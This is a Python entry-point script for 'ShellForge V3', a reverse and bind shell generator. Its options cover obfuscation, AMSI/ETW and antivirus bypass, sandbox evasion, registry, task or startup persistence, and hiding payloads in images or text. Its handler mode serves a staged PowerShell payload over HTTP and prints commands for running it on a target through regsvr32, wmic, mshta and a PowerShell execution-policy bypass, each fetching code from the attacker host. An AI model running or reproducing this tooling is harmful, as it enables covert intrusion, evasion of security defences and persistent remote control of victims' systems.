#!/usr/bin/env python3
"""
ShellForge V3 - The Insane Shell Generator
Main entry point
"""

import argparse
import sys
import os

from shellforge.core.generator import Generator
from shellforge.core.config import (
    VERSION, SUPPORTED_EXTENSIONS_WITH_ALIASES, DEFAULT_PORT, 
    DEFAULT_HTTP_PORT, BYPASS_TECHNIQUES, PERSISTENCE_METHODS,
    EXTENSION_ALIASES, AV_BYPASS_LEVELS
)
from shellforge.obfuscators.steganography import SteganographyEngine


def print_banner():
    """Print the ShellForge banner"""
    banner = f"""
\033[91m███████╗██╗  ██╗███████╗██╗     ██╗     ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
███████╗███████║█████╗  ██║     ██║     █████╗  ██║   ██║██████╔╝██║  ███╗█████╗  
╚════██║██╔══██║██╔══╝  ██║     ██║     ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  
███████║██║  ██║███████╗███████╗███████╗██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝\033[0m
                    \033[93m[ v{VERSION} - The Insane Shell Generator ]\033[0m
"""
    print(banner)


def main():
    parser = argparse.ArgumentParser(
        description=f"ShellForge V3 - The Insane Shell Generator (v{VERSION})",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  shellforge 192.168.1.100 4444 php                    # Basic PHP reverse shell
  shellforge 192.168.1.100 4444 ps1 --obfuscate        # Obfuscated PowerShell
  shellforge 192.168.1.100 4444 bash --bind            # Bind shell
  shellforge 192.168.1.100 4444 amsi --serve           # Handler mode with AMSI bypass
  shellforge 192.168.1.100 4444 powershell --sandbox   # With sandbox evasion
  shellforge 192.168.1.100 4444 ps1 --persist registry # With persistence
        """
    )
    
    # Positional arguments
    parser.add_argument("host", help="LHOST (Attacker IP)")
    parser.add_argument("port", type=int, nargs="?", default=DEFAULT_PORT, 
                        help=f"LPORT (Default: {DEFAULT_PORT})")
    parser.add_argument("extension", choices=SUPPORTED_EXTENSIONS_WITH_ALIASES, 
                        metavar="EXTENSION",
                        help=f"Payload type (e.g., php, bash, powershell, ps1, amsi)")
    
    # Output options
    parser.add_argument("-o", "--output", help="Output filename")
    parser.add_argument("-q", "--quiet", action="store_true", help="Suppress banner")
    
    # Shell type
    parser.add_argument("--bind", action="store_true", 
                        help="Generate bind shell instead of reverse shell")
    
    # Obfuscation
    parser.add_argument("--obfuscate", action="store_true", 
                        help="Enable polymorphic obfuscation")
    
    # Bypass techniques
    parser.add_argument("--bypass", choices=BYPASS_TECHNIQUES,
                        help="Bypass technique (zip_in_zip)")
    
    # Sandbox evasion
    parser.add_argument("--sandbox", action="store_true",
                        help="Add VM/sandbox detection and evasion")
    
    # Persistence
    parser.add_argument("--persist", choices=PERSISTENCE_METHODS,
                        help="Add persistence mechanism (registry, task, startup)")
    
    # AV/EDR Evasion
    parser.add_argument("--av-bypass", choices=AV_BYPASS_LEVELS,
                        help="AV/EDR bypass level (amsi=AMSI only, full=AMSI+ETW, max=ALL)")
    
    # Steganography
    parser.add_argument("--stego-bmp", metavar="IMAGE",
                        help="Embed payload in BMP image (provide cover image path)")
    parser.add_argument("--stego-txt", metavar="TEXTFILE",
                        help="Embed payload in text file whitespace")
    
    # Handler mode
    parser.add_argument("--serve", action="store_true", 
                        help="Auto-stage payload with HTTP server (Handler Mode)")
    parser.add_argument("--http-port", type=int, default=DEFAULT_HTTP_PORT,
                        help=f"HTTP server port for --serve mode (Default: {DEFAULT_HTTP_PORT})")
    
    args = parser.parse_args()

    # Print banner unless quiet mode
    if not args.quiet:
        print_banner()

    # Resolve extension alias
    resolved_ext = EXTENSION_ALIASES.get(args.extension, args.extension)
    
    # Determine output filename if not provided
    if not args.output:
        args.output = f"shell.{args.extension}"

    print(f"\033[94m[*]\033[0m Target: {args.host}:{args.port}")
    print(f"\033[94m[*]\033[0m Type: {resolved_ext}" + (f" (alias: {args.extension})" if args.extension != resolved_ext else ""))
    print(f"\033[94m[*]\033[0m Shell: {'Bind' if args.bind else 'Reverse'}")
    
    generator = Generator()
    
    try:
        # --- HANDLER MODE ---
        if args.serve:
            run_handler_mode(args, generator, resolved_ext)
            return

        # --- STANDARD MODE ---
        shell_type = "bind" if args.bind else "reverse"
        
        payload = generator.generate(
            host=args.host,
            port=args.port,
            extension=args.extension,
            output_file=args.output,
            obfuscate=args.obfuscate,
            bypass=args.bypass,
            shell_type=shell_type,
            sandbox_evasion=args.sandbox,
            persistence=args.persist,
            av_evasion=args.av_bypass
        )
        
        # Handle steganography
        if args.stego_bmp:
            handle_stego_bmp(payload, args)
            return
            
        if args.stego_txt:
            handle_stego_txt(payload, args)
            return

        # Print results
        print_success(args, payload)
            
    except Exception as e:
        print(f"\033[91m[-] Error: {str(e)}\033[0m")
        if os.environ.get('DEBUG'):
            import traceback
            traceback.print_exc()
        sys.exit(1)


def run_handler_mode(args, generator, resolved_ext):
    """Run in handler mode with HTTP server"""
    import http.server
    import socketserver
    import threading
    import time

    HTTP_PORT = args.http_port
    STAGE_FILE = "run.ps1"

    print(f"\033[93m[*] Mode: HANDLER (Auto-Staging)\033[0m")
    
    # Generate Stage Payload
    print(f"\033[94m[*]\033[0m Generating Stage 2 Payload ({STAGE_FILE})...")
    
    stage_content = generator.generate(
        host=args.host,
        port=args.port,
        extension="powershell",
        output_file=None,
        obfuscate=args.obfuscate,
        sandbox_evasion=args.sandbox,
        persistence=args.persist,
        av_evasion=args.av_bypass
    )
    
    # Write stage to disk
    with open(STAGE_FILE, "w") as f:
        if isinstance(stage_content, bytes):
            f.write(stage_content.decode('utf-8'))
        else:
            f.write(stage_content)
    print(f"\033[92m[+]\033[0m Stage 2 ({STAGE_FILE}) ready.")

    # Start HTTP Server
    class QuietHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            print(f"\033[93m[*]\033[0m HTTP: {self.client_address[0]} - {format%args}")
        def log_error(self, format, *args):
            pass

    def start_server():
        with socketserver.TCPServer(("", HTTP_PORT), QuietHandler) as httpd:
            print(f"\033[92m[+]\033[0m HTTP Server on port {HTTP_PORT}")
            httpd.serve_forever()

    t = threading.Thread(target=start_server)
    t.daemon = True
    t.start()
    
    # Generate Bypass Payload
    print(f"\033[94m[*]\033[0m Generating Bypass Payload ({args.output})...")
    
    generator.generate(
        host=args.host,
        port=HTTP_PORT,
        extension=args.extension,
        output_file=args.output,
        obfuscate=args.obfuscate,
        bypass=args.bypass
    )
    
    print(f"\033[92m[+]\033[0m Bypass Payload: {args.output}")
    print()
    print(f"\033[93m{'='*60}\033[0m")
    print(f"\033[93m  EXECUTE ON TARGET:\033[0m")
    print(f"\033[93m{'='*60}\033[0m")
    
    # Print execution instructions based on type
    if resolved_ext == "amsi":
        print(f"  powershell -ExecutionPolicy Bypass -File {args.output}")
    elif resolved_ext == "sct":
        print(f"  regsvr32 /s /n /u /i:http://{args.host}:{HTTP_PORT}/{args.output} scrobj.dll")
    elif resolved_ext == "xsl":
        print(f'  wmic process get brief /format:"http://{args.host}:{HTTP_PORT}/{args.output}"')
    elif resolved_ext == "msbuild":
        print(f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe {args.output}")
    elif resolved_ext == "hta":
        print(f"  mshta http://{args.host}:{HTTP_PORT}/{args.output}")
    elif resolved_ext in ["powershell", "ps1"]:
        print(f"  powershell -ExecutionPolicy Bypass -File {args.output}")
    else:
        print(f"  Execute: {args.output}")
    
    print(f"\033[93m{'='*60}\033[0m")
    print()
    print(f"\033[94m[*]\033[0m Waiting for connections... (Ctrl+C to stop)")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\033[94m[*]\033[0m Stopping server...")
        sys.exit(0)


def handle_stego_bmp(payload, args):
    """Handle BMP steganography"""
    print(f"\033[94m[*]\033[0m Embedding payload in BMP: {args.stego_bmp}")
    stego = SteganographyEngine()
    output_bmp = args.output if args.output.endswith('.bmp') else args.output + ".bmp"
    
    # Read payload content
    if os.path.exists(payload):
        with open(payload, 'r') as f:
            payload_content = f.read()
    else:
        payload_content = payload
    
    if stego.hide_in_bmp(payload_content, args.stego_bmp, output_bmp):
        print(f"\033[92m[+]\033[0m Steganography successful: {output_bmp}")
        print(f"\033[92m[+]\033[0m Size: {os.path.getsize(output_bmp)} bytes")
    else:
        print("\033[91m[-] Steganography failed.\033[0m")


def handle_stego_txt(payload, args):
    """Handle text whitespace steganography"""
    print(f"\033[94m[*]\033[0m Embedding payload in Text: {args.stego_txt}")
    stego = SteganographyEngine()
    output_txt = args.output if args.output.endswith('.txt') else args.output + ".txt"
    
    # Read payload content
    if os.path.exists(payload):
        with open(payload, 'r') as f:
            payload_content = f.read()
    else:
        payload_content = payload
    
    if stego.hide_in_whitespace(payload_content, args.stego_txt, output_txt):
        print(f"\033[92m[+]\033[0m Steganography successful: {output_txt}")
        print(f"\033[92m[+]\033[0m Size: {os.path.getsize(output_txt)} bytes")
    else:
        print("\033[91m[-] Steganography failed.\033[0m")


def print_success(args, payload):
    """Print success message with details"""
    # Determine actual output file
    if isinstance(payload, str) and os.path.exists(payload):
        output_file = payload
    else:
        output_file = args.output
    
    print(f"\033[92m[+]\033[0m Generated: {output_file}")
    
    if os.path.exists(output_file):
        size = os.path.getsize(output_file)
        print(f"\033[92m[+]\033[0m Size: {size} bytes")
    
    # Print applied features
    features = []
    if args.obfuscate:
        features.append("Obfuscation")
    if args.bypass:
        features.append(f"Bypass:{args.bypass}")
    if args.sandbox:
        features.append("Sandbox-Evasion")
    if args.persist:
        features.append(f"Persistence:{args.persist}")
    
    if features:
        print(f"\033[92m[+]\033[0m Features: {', '.join(features)}")


if __name__ == "__main__":
    main()
